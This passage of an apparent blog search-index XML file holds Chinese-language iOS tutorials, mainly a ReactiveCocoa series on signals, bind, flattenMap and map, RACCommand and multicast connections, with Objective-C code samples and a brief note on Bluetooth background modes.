// 获取电池电量 // ...... &#125; &#125;]; 关于后台模式 按照Apple的一贯尿性，打着保护隐私的名义限制各种Api和权限，如果想蓝牙在后台运行也是需要申请权限并配置的 App没有申请后台权限则在进入后台模式之后很快就会被挂起（按下home键，大约5秒，app进入suspended状态）。 当app处于挂起状态时，无法处理任何蓝牙相关的任务直到app进入前台（被用户唤醒）。 处于后台模式（backgroud state）或者悬挂模式（suspended state）时，作为中心设备，无法搜索和发现周边在广告的设备。作为外设时，无法广告，此时中心想要通过公开服务的特征去访问它的话都会报错。 具体的后台模式设置及恢复请参考 iOS BLE 开发小记 - 如何实现 CoreBluetooth 后台运行模式 关于Demo 需要Demo请点击这里下载 参考Apple官方文档iOS BLE 开发小记 - 如何实现 CoreBluetooth 后台运行模式]]></content>
      <categories>
        <category>iOS</category>
        <category>蓝牙</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>蓝牙</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS蓝牙开发之外设篇]]></title>
    <url>%2Farchives%2Fbd3ad682.html</url>
    <content type="text"><![CDATA[我时常回到童年，用一片童心来思考问题，很多烦恼的问题就变得易解。——王小波 《一只特立独行的猪》 占坑]]></content>
      <categories>
        <category>iOS</category>
        <category>蓝牙</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>蓝牙</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发ReactiveCocoa（七）：开发中常见用法]]></title>
    <url>%2Farchives%2F2a9c0fa5.html</url>
    <content type="text"><![CDATA[危楼高百尺，手可摘星辰。不敢高声语，恐惊天上人。 ——李白《夜宿山寺》 实际项目中的不同风格用法参考常用的写法用RAC替代 控件赋值也可以这么样用（类似于cell中设置）12345678910111213141516RAC(self.textLabel, text) = RACObserve(self, city.cityName); // 直接给label文字赋值RAC(self.imgView, image) = [[[RACObserve(self, city.thumbnailData) // 直接给imageView 赋值 ignore:nil] map:^id(id value) &#123; // 转换图片 return [[[RACSignal createSignal:^RACDisposable *(id&lt;RACSubscriber&gt; subscriber) &#123; UIImage *image = [UIImage imageWithData:value]; [subscriber sendNext:image]; [subscriber sendCompleted]; return nil; &#125;] subscribeOn:[RACScheduler scheduler]] deliverOn:[RACScheduler mainThreadScheduler]]; // 主线程更新&#125;]switchToLatest]; 转模型也可以这么用12345678910111213141516171819- (void)initSearchSubscrition &#123;[[self.searchSignal deliverOn:[RACScheduler mainThreadScheduler]] subscribeNext:^(RACTuple *jsonSearchResult) &#123; NSDictionary *response; if (jsonSearchResult.count) &#123; response = jsonSearchResult.first; &#125; NSArray *rawArray = response[@"geoNames"]; self.cities = [[[rawArray.rac_sequence // 获取的数据转rac_sequence (里面都是信号) map:^id(NSDictionary *rawDic) &#123; // 转模型 NSMutableDictionary *dic = [(NSDictionary *)rawDic mutableCopy]; City *city = [MTLJSONAdapter modelOfClass:City.class fromJSONDictionary:dic error:nil]; [self downloadImageForCity:city]; return city; &#125;] array] mutableCopy]; // 放进数组中 并拷贝新生成一份 &#125;]; [self.searchSignal subscribeError:^(NSError *error) &#123; self.statusMessage = @"offLine"; &#125;];&#125; 代理方法也可以这么调12345[[self rac_signalForSelector:@selector(didSaveDataCallback:) fromProtocol:@protocol(SaveDataCallBack)] subscribeNext:^(RACTuple *tuple) &#123; City *newCity = tuple.first; [self.viewModel.cities insertObject:newCity atIndex:0]; [self.geoTbl reloadData]; &#125;]; 多个渠道请求数据都返回才能进行下一步 可以这么组装1234567891011121314151617181920212223RACSignal *requestHot = [RACSignal createSignal:^RACDisposable *(id&lt;RACSubscriber&gt; subscriber) &#123; NSLog(@"请求最热商品"); [subscriber sendNext:@"获取最热商品"]; return nil; &#125;];RACSignal *requestNew = [RACSignal createSignal:^RACDisposable *(id&lt;RACSubscriber&gt; subscriber) &#123; NSLog(@"请求最新商品"); // [subscriber sendNext:@"获取最新商品"]; return nil; &#125;]; // Selector调用:当所有信号都发送数据的时候调用 // 数组存放信号 // Selector注意点:参数根据数组元素决定 // Selector方法参数类型,就是信号传递出来数据 [self rac_liftSelector:@selector(updateUI:data2:) withSignalsFromArray:@[requestHot,requestNew]]; &#125; // 只要两个请求都请求完成的时候才会调用 - (void)updateUI:(NSString *)data1 data2:(NSString *)data2 &#123; NSLog(@"%@ %@",data1,data2); &#125; 监听属性改变12// 设置Label 文字跟着 TextField的改变而改变RAC(self.myLab, text) = self.myTF.rac_textSignal; 1234// 监听某一个属性的改变[RACObserve(self.per, name) subscribeNext:^(NSString *name) &#123; // name 即 self.per.name&#125;]; 数组1234NSArray *array = @[@1, @2, @3, @4, @5];[array.rac_sequence.signal subscribeNext:^(id x) &#123; // x 即 数组 array 的元素 &#125;]; 1234// 过滤 filter，并获取过滤后的数组NSArray *filter = [[array.rac_sequence filter:^BOOL(id value) &#123; return [value integerValue] &gt; 2;&#125;] array]; 123456// 匹配、映射 map，变换元素并获取新数组NSArray *map = [[array.rac_sequence map:^id(id value) &#123; NSInteger a = [value integerValue] * [value integerValue]; return [NSString stringWithFormat:@"%ld", a];&#125;] array]; 字典1234567// rac_keySequence 和 rac_valueSequence 跟数组一样// rac_sequence 需要 RACTupleUnpack 解包NSDictionary *dic = @&#123;@"name": @"lion", @"age": @18&#125;;[dic.rac_sequence.signal subscribeNext:^(id x) &#123; RACTupleUnpack(NSString *key, NSString *value) = x; NSLog(@"\r\nkey: %@\r\nvalue: %@", key, value);&#125;];]]></content>
      <categories>
        <category>iOS</category>
        <category>ReactiveCocoa</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>RAC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发ReactiveCocoa（六）：冷信号与热信号]]></title>
    <url>%2Farchives%2F53929de4.html</url>
    <content type="text"><![CDATA[谁家玉笛暗飞声，散入春风满洛城。此夜曲中闻折柳，何人不起故园情。 ——李白《春夜洛城闻笛》 冷信号与热信号特点 热信号是主动的，即使你没有订阅事件，它仍然会时刻推送。（例如它会推送值即使还没有订阅者）而冷信号是被动的，只有当你订阅的时候，它才会发送消息。 热信号可以有多个订阅者，是一对多，信号可以与订阅者共享信息。（订阅者1和订阅者2是共享的，他们都能在同一时间接收到某个值），而冷信号只能一对一，当有不同的订阅者，消息会从新完整发送。（两个订阅者没有联系，都是基于各自的订阅时间开始接收消息的）。 美团的几篇资料 （开发中可能遇到的坑） 细说ReactiveCocoa的冷信号与热信号1 细说ReactiveCocoa的冷信号与热信号2 细说ReactiveCocoa的冷信号与热信号3 RACSignal的Subscription深入分析]]></content>
      <categories>
        <category>iOS</category>
        <category>ReactiveCocoa</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>RAC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发ReactiveCocoa（五）：RAC底层bind]]></title>
    <url>%2Farchives%2Fa972913f.html</url>
    <content type="text"><![CDATA[故人西辞黄鹤楼，烟花三月下扬州。孤帆远影碧空尽，唯见长江天际流。 ——李白《送孟浩然之广陵》 bind方法简单介绍和使用123456789101112131415161718192021222324252627282930313233343536373839404142434445// 假设想监听文本框的内容，并且在每次输出结果的时候，都在文本框的内容拼接一段文字“输出：”// 方式一:在返回结果后，拼接。 [_textField.rac_textSignal subscribeNext:^(id x) &#123; NSLog(@"输出:%@",x); &#125;];// 方式二:在返回结果前，拼接，使用RAC中bind方法做处理。// bind方法参数:需要传入一个返回值是RACStreamBindBlock的block参数// RACStreamBindBlock是一个block的类型，返回值是信号，参数（value,stop），因此参数的block返回值也是一个block。// RACStreamBindBlock:// 参数一(value):表示接收到信号的原始值，还没做处理// 参数二(*stop):用来控制绑定Block，如果*stop = yes,那么就会结束绑定。// 返回值：信号，做好处理，在通过这个信号返回出去，一般使用RACReturnSignal,需要手动导入头文件RACReturnSignal.h。// bind方法使用步骤:// 1.传入一个返回值RACStreamBindBlock的block。// 2.描述一个RACStreamBindBlock类型的bindBlock作为block的返回值。// 3.描述一个返回结果的信号，作为bindBlock的返回值。// 注意：在bindBlock中做信号结果的处理。// 底层实现:// 1.源信号调用bind,会重新创建一个绑定信号。// 2.当绑定信号被订阅，就会调用绑定信号中的didSubscribe，生成一个bindingBlock。// 3.当源信号有内容发出，就会把内容传递到bindingBlock处理，调用bindingBlock(value,stop)// 4.调用bindingBlock(value,stop)，会返回一个内容处理完成的信号（RACReturnSignal）。// 5.订阅RACReturnSignal，就会拿到绑定信号的订阅者，把处理完成的信号内容发送出来。// 注意:不同订阅者，保存不同的nextBlock，看源码的时候，一定要看清楚订阅者是哪个。// 这里需要手动导入#import &lt;ReactiveCocoa/RACReturnSignal.h&gt;，才能使用RACReturnSignal。[[_textField.rac_textSignal bind:^RACStreamBindBlock&#123; // 什么时候调用: // block作用:表示绑定了一个信号. return ^RACStream *(id value, BOOL *stop)&#123; // 什么时候调用block:当信号有新的值发出，就会来到这个block。 // block作用:做返回值的处理 // 做好处理，通过信号返回出去. return [RACReturnSignal return:[NSString stringWithFormat:@"输出:%@",value]]; &#125;;&#125;] subscribeNext:^(id x) &#123; NSLog(@"%@",x);&#125;];]]></content>
      <categories>
        <category>iOS</category>
        <category>ReactiveCocoa</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>RAC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发ReactiveCocoa（四）：Flattenmap和Map]]></title>
    <url>%2Farchives%2F8b316e8d.html</url>
    <content type="text"><![CDATA[峨眉山月半轮秋，影入平羌江水流。夜发清溪向三峡，思君不见下渝州。 ——李白《峨眉山月歌》 flattenMap和Map flattenMap，Map用于把源信号内容映射成新的内容 flattenMap简单使用 12345678910111213141516171819202122232425262728// 监听文本框的内容改变，把结构重新映射成一个新值.// flattenMap作用:把源信号的内容映射成一个新的信号，信号可以是任意类型。// flattenMap使用步骤:// 1.传入一个block，block类型是返回值RACStream，参数value// 2.参数value就是源信号的内容，拿到源信号的内容做处理// 3.包装成RACReturnSignal信号，返回出去。// flattenMap底层实现:// 0.flattenMap内部调用bind方法实现的,flattenMap中block的返回值，会作为bind中bindBlock的返回值。// 1.当订阅绑定信号，就会生成bindBlock。// 2.当源信号发送内容，就会调用bindBlock(value, *stop)// 3.调用bindBlock，内部就会调用flattenMap的block，flattenMap的block作用：就是把处理好的数据包装成信号。// 4.返回的信号最终会作为bindBlock中的返回信号，当做bindBlock的返回信号。// 5.订阅bindBlock的返回信号，就会拿到绑定信号的订阅者，把处理完成的信号内容发送出来。[[_textField.rac_textSignal flattenMap:^RACStream *(id value) &#123; // block什么时候 : 源信号发出的时候，就会调用这个block。 // block作用 : 改变源信号的内容。 // 返回值：绑定信号的内容. return [RACReturnSignal return:[NSString stringWithFormat:@"输出:%@",value]];&#125;] subscribeNext:^(id x) &#123; // 订阅绑定信号，每当源信号发送内容，做完处理，就会调用这个block。 NSLog(@"%@",x);&#125;]; Map简单使用: 123456789101112131415161718192021222324// 监听文本框的内容改变，把结构重新映射成一个新值.// Map作用:把源信号的值映射成一个新的值// Map使用步骤:// 1.传入一个block,类型是返回对象，参数是value// 2.value就是源信号的内容，直接拿到源信号的内容做处理// 3.把处理好的内容，直接返回就好了，不用包装成信号，返回的值，就是映射的值。// Map底层实现:// 0.Map底层其实是调用flatternMap,Map中block中的返回的值会作为flatternMap中block中的值。// 1.当订阅绑定信号，就会生成bindBlock。// 3.当源信号发送内容，就会调用bindBlock(value, *stop)// 4.调用bindBlock，内部就会调用flattenMap的block// 5.flattenMap的block内部会调用Map中的block，把Map中的block返回的内容包装成返回的信号。// 5.返回的信号最终会作为bindBlock中的返回信号，当做bindBlock的返回信号。// 6.订阅bindBlock的返回信号，就会拿到绑定信号的订阅者，把处理完成的信号内容发送出来。 [[_textField.rac_textSignal map:^id(id value) &#123; // 当源信号发出，就会调用这个block，修改源信号的内容 // 返回值：就是处理完源信号的内容。 return [NSString stringWithFormat:@"输出:%@",value];&#125;] subscribeNext:^(id x) &#123; NSLog(@"%@",x);&#125;]; FlatternMap和Map的区别 FlatternMap中的Block返回信号。 Map中的Block返回对象。 开发中，如果信号发出的值不是信号，映射一般使用Map 开发中，如果信号发出的值是信号，映射一般使用FlatternMap 总结：signalOfsignals用FlatternMap 123456789101112131415161718// 创建信号中的信号RACSubject *signalOfsignals = [RACSubject subject];RACSubject *signal = [RACSubject subject];[[signalOfsignals flattenMap:^RACStream *(id value) &#123; // 当signalOfsignals的signals发出信号才会调用 return value;&#125;] subscribeNext:^(id x) &#123; // 只有signalOfsignals的signal发出信号才会调用，因为内部订阅了bindBlock中返回的信号，也就是flattenMap返回的信号。 // 也就是flattenMap返回的信号发出内容，才会调用。 NSLog(@"%@aaa",x);&#125;];// 信号的信号发送信号[signalOfsignals sendNext:signal];// 信号发送内容[signal sendNext:@1];]]></content>
      <categories>
        <category>iOS</category>
        <category>ReactiveCocoa</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>RAC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发ReactiveCocoa（三）：RACMulticastConnection]]></title>
    <url>%2Farchives%2Ffec44934.html</url>
    <content type="text"><![CDATA[朝辞白帝彩云间，千里江陵一日还。两岸猿声啼不住，轻舟已过万重山。 ——李白《早发白帝城》 RACMulticastConnection 用于当一个信号，被多次订阅时，为了保证创建信号时，避免多次调用创建信号中的block，造成副作用，可以使用这个类处理。 使用注意:RACMulticastConnection通过RACSignal的-publish或者-muticast:方法创建. RACMulticastConnection使用步骤: 创建信号 + (RACSignal *)createSignal:(RACDisposable * (^)(id&lt;RACSubscriber&gt; subscriber))didSubscribe 创建连接 RACMulticastConnection *connect = [signal publish]; 订阅信号,注意：订阅的不在是之前的信号，而是连接的信号：connect.signal 连接 [connect connect] RACMulticastConnection底层原理: 创建connect，connect.sourceSignal -&gt; RACSignal(原始信号) connect.signal -&gt; RACSubject 订阅connect.signal，会调用RACSubject的subscribeNext，创建订阅者，而且把订阅者保存起来，不会执行block。 [connect connect]内部会订阅RACSignal(原始信号)，并且订阅者是RACSubject- 订阅原始信号，就会调用原始信号中的didSubscribe - didSubscribe，拿到订阅者调用sendNext，其实是调用RACSubject的sendNext RACSubject的sendNext,会遍历RACSubject所有订阅者发送信号。- 因为刚刚第二步，都是在订阅RACSubject，因此会拿到第二步所有的订阅者，调用他们的nextBlock 需求：假设在一个信号中发送请求，每次订阅一次都会发送请求，这样就会导致多次请求。解决：使用RACMulticastConnection就能解决. 1234567891011121314151617181920212223242526272829303132333435363738// 1.创建请求信号RACSignal *signal = [RACSignal createSignal:^RACDisposable *(id&lt;RACSubscriber&gt; subscriber&#123; NSLog(@"发送请求"); return nil;&#125;];// 2.订阅信号[signal subscribeNext:^(id x) &#123; NSLog(@"接收数据");&#125;];// 2.订阅信号[signal subscribeNext:^(id x) &#123; NSLog(@"接收数据");&#125;];// 3.运行结果，会执行两遍发送请求，也就是每次订阅都会发送一次请求// RACMulticastConnection:解决重复请求问题// 1.创建信号RACSignal *signal = [RACSignal createSignal:^RACDisposable *(id&lt;RACSubscriber&gt; subscriber) &#123; NSLog(@"发送请求"); [subscriber sendNext:@1]; return nil;&#125;];// 2.创建连接RACMulticastConnection *connect = [signal publish];// 3.订阅信号，// 注意：订阅信号，也不能激活信号，只是保存订阅者到数组，必须通过连接,当调用连接，就会一次性调用所有订阅者的sendNext:[connect.signal subscribeNext:^(id x) &#123; NSLog(@"订阅者一信号");&#125;];[connect.signal subscribeNext:^(id x) &#123; NSLog(@"订阅者二信号");&#125;];// 4.连接,激活信号[connect connect];]]></content>
      <categories>
        <category>iOS</category>
        <category>ReactiveCocoa</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>RAC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发ReactiveCocoa（二）：RACCommand篇]]></title>
    <url>%2Farchives%2F63f63348.html</url>
    <content type="text"><![CDATA[日照香炉生紫烟，遥看瀑布挂前川。飞流直下三千尺，疑是银河落九天。 ——李白《望庐山瀑布》 RACCommand 简单使用 RAC中用于处理事件的类，可以把事件如何处理,事件中的数据如何传递，包装到这个类中，他可以很方便的监控事件的执行过程。 executionSignals是signal of signals，如果直接subscribe的话会得到一个signal，而不是我们想要的value，所以一般会配合switchToLatest。 errors : 跟正常的signal不一样，RACCommand的错误不是通过sendError来实现的，而是通过errors属性传递出来的。 executing 表示该command当前是否正在执行。 一、RACCommand使用步骤: 创建命令 initWithSignalBlock:(RACSignal*(^)(id input))signalBlock 在signalBlock中，创建RACSignal，并且作为signalBlock的返回值 执行命令 - (RACSignal *)execute:(id)input 二、RACCommand使用注意: signalBlock必须要返回一个信号，不能传nil. 如果不想要传递信号，直接创建空的信号[RACSignal empty]; RACCommand中信号如果数据传递完，必须调用[subscriber sendCompleted]，这时命令才会执行完毕，否则永远处于执行中。 三、RACCommand设计思想：内部signalBlock为什么要返回一个信号，这个信号有什么用。 在RAC开发中，通常会把网络请求封装到RACCommand，直接执行某个RACCommand就能发送请求。 当RACCommand内部请求到数据的时候，需要把请求的数据传递给外界，这时候就需要通过signalBlock返回的信号传递了。 四、如何拿到RACCommand中返回信号发出的数据。 RACCommand有个执行信号源executionSignals，这个是signal of signals(信号的信号),意思是信号发出的数据是信号，不是普通的类型。 订阅executionSignals就能拿到RACCommand中返回的信号，然后订阅signalBlock返回的信号，就能获取发出的值。 五、监听当前命令是否正在执行executing六、使用场景,监听按钮点击，网络请求 1234567891011121314151617181920212223242526272829303132333435363738394041424344// 1.创建命RACCommand *command = [[RACCommand alloc] initWithSignalBlock:^RACSignal *(id input) &#123; NSLog(@"执行命令"); // 创建空信号,必须返回信号 // return [RACSignal empty]; // 2.创建信号,用来传递数据 return [RACSignal createSignal:^RACDisposable *(id&lt;RACSubscriber&gt; subscriber) &#123; [subscriber sendNext:@"请求数据"]; // 注意：数据传递完，最好调用sendCompleted，这时命令才执行完毕。 [subscriber sendCompleted]; return nil; &#125;]; &#125;]; // 强引用命令，不要被销毁，否则接收不到数据 _conmmand = command; // 3.订阅RACCommand中的信号 [command.executionSignals subscribeNext:^(id x) &#123; [x subscribeNext:^(id x) &#123; NSLog(@"%@",x); &#125;]; &#125;]; // RAC高级用法 // switchToLatest:用于signal of signals，获取signal of signals发出的最新信号,也就是可以直接拿到RACCommand中的信号 [command.executionSignals.switchToLatest subscribeNext:^(id x) &#123; NSLog(@"%@",x); &#125;]; // 4.监听命令是否执行完毕,默认会来一次，可以直接跳过，skip表示跳过第一次信号。 [[command.executing skip:1] subscribeNext:^(id x) &#123; if ([x boolValue] == YES) &#123; // 正在执行 NSLog(@"正在执行"); &#125; else &#123; // 执行完成 NSLog(@"执行完成"); &#125;&#125;];// 5.执行命令[self.conmmand execute:@1];]]></content>
      <categories>
        <category>iOS</category>
        <category>ReactiveCocoa</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>RAC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发ReactiveCocoa（一）：介绍]]></title>
    <url>%2Farchives%2F48d913e0.html</url>
    <content type="text"><![CDATA[君不见黄河之水天上来，奔流到海不复回。君不见高堂明镜悲白发，朝如青丝暮成雪。人生得意须尽欢，莫使金樽空对月。天生我材必有用，千金散尽还复来。烹羊宰牛且为乐，会须一饮三百杯。岑夫子，丹丘生，将进酒，杯莫停。与君歌一曲，请君为我侧耳听。钟鼓馔玉不足贵，但愿长醉不复醒。古来圣贤皆寂寞，惟有饮者留其名。陈王昔时宴平乐，斗酒十千恣欢谑。主人何为言少钱，径须沽取对君酌。五花马，千金裘，呼儿将出换美酒，与尔同销万古愁。 ——李白《将进酒·君不见黄河之水天上来》 ReactiveCocoa 是函数响应编程(Functional Reactive Programming, FRP)框架 实际的开发中是和MVVM结合进行开发、互相弥补 Github上整合的比较全面的（MVVM、RAC）学习资料 Github 上面比较全的资料 美团的几篇资料 （开发中可能遇到的坑） 细说ReactiveCocoa的冷信号与热信号1 细说ReactiveCocoa的冷信号与热信号2 细说ReactiveCocoa的冷信号与热信号3 RACSignal的Subscription深入分析 注意点 RAC只处理对象, 而不处理像BOOL这样的原始值. 不过, RAC通常会帮我们自动做这些转换. 使用Cocoapods导入ReactiveCocoa 报错 ld: library not found for -lPods 解决方法 : Target’s General settings and go to Linked Frameworks and Libraries and just delete -libPods.a from the list. 信号的释放 ReactiveCocoa维护了一个全局的信号集合。 如果信号有一个或多个订阅者，它就是可用的。如果所有订阅者都被移除了，信号就被释放了。 信号的取消订阅 在一个completed事件或error事件后，一个订阅者会自动将自己移除。 手动移除可能通过RACDisposable来完成。RACSignal的所有订阅方法都返回一个RACDisposable实例，我们可以调用它的dispose方法来手动移除订阅者。 如果我们创建了一个信号，但不去订阅它，则信号永远不会执行，包括任何如doNext:这样的附加操作。 Signal events是线性的，不会出现并发的情况，除非显式地指定Scheduler。所以subscribeNext:error:completed:里的block不需要锁定或者synchronized等操作，其他的events会依次排队，直到block处理完成。 生成Signal时，最好指定Name, -setNameWithFormat: 方便调试 Side Effect （副作用） Hot signals without side effects 最好使用property，如“textChanged”，不太理解什么情况用到这个，权当做一个静态的属性来看就行。 Cold signals without side effects 使用名词类型的方法名，如“-currentText”，“currentModels”，同时表明了返回值是什么（这个尤其得注意，RACSignal的next值是id类型，所以全得是靠约定才知道具体返回类型） Signals with side effects 这种就是像login一样有副作用的了，推荐使用动词类型的方法名，用对动词基本就能知道是不是有副作用了，比如“-loginSignal”和“-saveToFile”大概就知道前面一个很可能有副作用，后面一个多存几次文件应该没副作用 RAC VS 原生 rac_signalForSelector：用于替代代理 rac_valuesAndChangesForKeyPath：用于监听某个对象的属性改变 rac_signalForControlEvents：用于监听某个事件。 rac_addObserverForName:用于监听某个通知 rac_textSignal:只要文本框发出改变就会发出这个信号 处理当界面有多次请求时，需要都获取到数据时，才能展示界面 rac_liftSelector:withSignalsFromArray:Signals:当传入的Signals(信号数组)，每一个signal都至少sendNext过一次，就会去触发第一个selector参数的方法 使用注意：几个信号，参数一的方法就几个参数，每个参数对应信号发出的数据 RAC提供的宏 RAC() 你提供想要与即将到来的值绑定的对象和参数, 在其内部它所做的是创建一个订阅者并更新其属性的值 这个宏是最常用的，RAC()总是出现在等号左边，等号右边是一个RACSignal，表示的意义是将一个对象的一个属性和一个signal绑定，signal每产生一个value（id类型），都会自动执行：[TARGET setValue:value ?: NIL_VALUE forKeyPath:KEYPATH]; 12345RACSignal *usernameIsValidSignal = RACObserve(self.viewModel, isUsernameValid);RAC(self.goButton, enabled) = usernameIsValidSignal; RAC(self.goButton, alpha) = [usernameIsValidSignal map:^id(NSNumber *usernameIsValid)&#123; return usernameIsValid.boolValue ? @1.0 : @0.5; &#125;]; RACObserve() 这个宏是RAC中对KVO中那些API的替代. 你只需要传入对象和你想观察的那个对象某属性的 keypath. 给出这些参数后, RACObserve会创建一个信号, 一旦它有了订阅者, 它就立刻发送那个属性的当前值, 并在发送那个属性在这之后的任何变化. 123456// create and get a reference to the signal RACSignal *usernameValidSignal = RACObserve(self.viewModel, isUsernameValid);// update the local property when this value changes[usernameValidSignal subscribeNext: ^(NSNumber *isValidNumber) &#123;self.usernameIsValid = isValidNumber. boolValue&#125;]; 循环引用的宏 @weakify(self); // 在外面声明 @strongify(self); // 在引用的地方声明 这两个宏一定成对出现，先weak再strong 常用知识点 map : 将一个值转化为另一个值输出 将会创建一个和原来一模一样的信号，只不过新的信号传递的值变为了block（value），也就是说，如果block(value)是一个信号，那么就是信号的value仍然是信号。 flattenMap : 解决Signal of Signals问题，flattenMap则会继续调用这个信号的value，作为新的信号的value。 switchToLatest : 用于signal of signals，获取signal of signals发出的最新信号,也就是可以直接拿到RACCommand中的信号 filter : 过滤一些条件，以确保符合条件的值才能被传递出去 ignore : 忽略给定的值 注意，这里忽略的既可以是地址相同的对象，也可以是- isEqual:结果相同的值，也就是说自己写的Model对象可以通过重写- isEqual:方法来使- ignore:生效。常用的值的判断没有问题，如下: 1234[[self.inputTextField.rac_textSignal ignore:@"seven"] subscribeNext:^(NSString *value)&#123;NSLog(@"`seven` could never appear : %@", value);&#125;]; distinctUntilChanged : 它将这一次的值与上一次做比较，当相同时（也包括- isEqual:）被忽略掉。 1234RAC(self.label, text) = [RACObserve(self.user, username) distinctUntilChanged];self.user.username = @"sunnyxx"; // 1stself.user.username = @"sunnyxx"; // 2ndself.user.username = @"sunnyxx"; // 3rd 如果不增加distinctUntilChanged的话对于连续的相同的输入值就会有不必要的处理，这个栗子只是简单的UI刷新，但遇到如写数据库，发网络请求的情况时，代价就不能购忽略了。 所以，对于相同值可以忽略的情况，果断加上它吧。 起止点过滤类型 除了被动的当next值来的时候做判断，也可以主动的提前选择开始和结束条件，分为两种类型： take型（取） skip型(跳) take:(NSUInteger) : 从开始一共取N次的next值，不包括Competion和Error，如： 123456789[[[RACSignal createSignal:^RACDisposable *(id&lt;RACSubscriber&gt; subscriber) &#123;[subscriber sendNext:@"1"];[subscriber sendNext:@"2"];[subscriber sendNext:@"3"];[subscriber sendCompleted];return nil;&#125;] take:2] subscribeNext:^(id x) &#123;NSLog(@"only 1 and 2 will be print: %@", x);&#125;]; takeLast:(NSUInteger) : 取最后N次的next值 注意，由于一开始不能知道这个Signal将有多少个next值，所以RAC实现它的方法是将所有next值都存起来，然后原Signal完成时再将后N个依次发送给接收者 但Error发生时依然是立刻发送的 takeUntil:(RACSignal *) : 当给定的signal完成前一直取值, 也就是这个Signal一直到textField执行dealloc时才停止。最简单的栗子就是UITextField的rac_textSignal的实现（删减版本）: 123456789- (RACSignal *)rac_textSignal &#123;@weakify(self);return [[[[[RACSignal concat:[self rac_signalForControlEvents:UIControlEventEditingChanged]] map:^(UITextField *x) &#123; return x.text; &#125;] takeUntil:self.rac_willDeallocSignal] // bingo!&#125; takeUntilBlock:(BOOL(^)(id x)) : 对于每个next值，运行block，当block返回YES时停止取值，如： 12345[[self.inputTextField.rac_textSignal takeUntilBlock:^BOOL(NSString *value) &#123;return [value isEqualToString:@"stop"];&#125;] subscribeNext:^(NSString *value) &#123;NSLog(@"current value is not `stop`: %@", value);&#125;]; takeWhileBlock:(BOOL(^)(id x)) : 上面的反向逻辑，对于每个next值，block返回 YES时才取值 skip:(NSUInteger) : 从开始跳过N次的next值，简单的栗子： 123456789[[[RACSignal createSignal:^RACDisposable *(id&lt;RACSubscriber&gt; subscriber) &#123;[subscriber sendNext:@"1"];[subscriber sendNext:@"2"];[subscriber sendNext:@"3"];[subscriber sendCompleted];return nil;&#125;] skip:1] subscribeNext:^(id x) &#123;NSLog(@"only 2 and 3 will be print: %@", x);&#125;]; skipUntilBlock:(BOOL(^)(id x)) : 和- takeUntilBlock:同理，一直跳，直到block为YES skipWhileBlock:\(BOOL(^)(id x)) : 和- takeWhileBlock:同理，一直跳，直到block为NO merge : 合并信号，只要有一个信号变化就会调用 12345678@weakify(self); [[RACSignal merge: @[RACObserve(self.viewModel, tweets),RACObserve(self.viewModel, allTweetsLoaded)]]bufferWithTime: 0 onScheduler: [RACScheduler mainThreadScheduler]]subscribeNext: ^(id value) &#123;@strongify(self);[self.tableView reloadData];&#125;]; combineLatest : 将多个信号合并起来，并且拿到各个信号的最新的值,必须每个合并的signal至少都有过一次sendNext，才会触发合并的信号 根据组合的信号的值再转换生成判断条件 1234567RACSignal *signupActiveSignal = [RACSignal combineLatest:@[validUsernameSignal,validPwdSignal] reduce:^id(NSNumber *usernameValid, NSNumber *passwordValid) &#123;return @(usernameValid.boolValue &amp;&amp; passwordValid.boolValue);&#125;];[signupActiveSignal subscribeNext:^(NSNumber *state) &#123;self.signInButton.enabled = state.boolValue;&#125;]; doNext: 注意doNext:并不返回一个值，因为它是附加操作。它完成时不改变事件。 concat: 按一定顺序拼接信号，当多个信号发出的时候，有顺序的接收信号 （只需要订阅拼接的信号就可以了） then: then方法会等到completed事件发出后调用，然后订阅由then:block参数返回的信号。这有效地将控制从一个信号传递给下一个信号 zipWith: 把两个信号压缩成一个信号，只有当两个信号同时发出信号内容时，并且把两个信号的内容合并成一个元组，才会触发压缩流的next事件 RACScheduler : 是RAC里面对线程的简单封装，事件可以在指定的scheduler上分发和执行， 不特殊指定的话，事件的分发和执行都在一个默认的后台线程里面做，大多数情况也就不用动了 有一些特殊的signal必须在主线程调用，使用-deliverOn：可以切换调用的线程。 deliverOn: 更新UI的时候回到主线程执行（子线程加载图片、主线程刷新UI） 1deliverOn:[RACScheduler mainThreadScheduler] chain : multicast : 避免副作用，这两个订阅者接收到了同样的一个请求的内容 1234567891011// Starts a single request, no matter how many subscriptions `connection.signal`// gets. This is equivalent to the -replay operator, or similar to// +startEagerlyWithScheduler:block:.RACMulticastConnection *connection = [networkRequest multicast:[RACReplaySubject subject]];[connection connect];[connection.signal subscribeNext:^(id response) &#123; NSLog(@"subscriber one: %@", response);&#125;];[connection.signal subscribeNext:^(id response) &#123; NSLog(@"subscriber two: %@", response);&#125;]; timeout : 超时，可以让一个信号在一定的时间后，自动报错 interval : 定时，每隔一段时间发出信号 delay : 延迟发送next retry重试 : 只要失败，就会重新执行创建信号中的block,直到成功 replay重放 : 当一个信号被多次订阅,反复播放内容 throttle节流 : 当某个信号发送比较频繁时，可以使用节流，在某一段时间不发送信号内容，过了一段时间获取信号的最新内容发出 延时处理，只有在两次next事件间隔指定的时间时才会发送第二个next事件]]></content>
      <categories>
        <category>iOS</category>
        <category>ReactiveCocoa</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>RAC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发中碎片知识整理]]></title>
    <url>%2Farchives%2Ffd0d6f33.html</url>
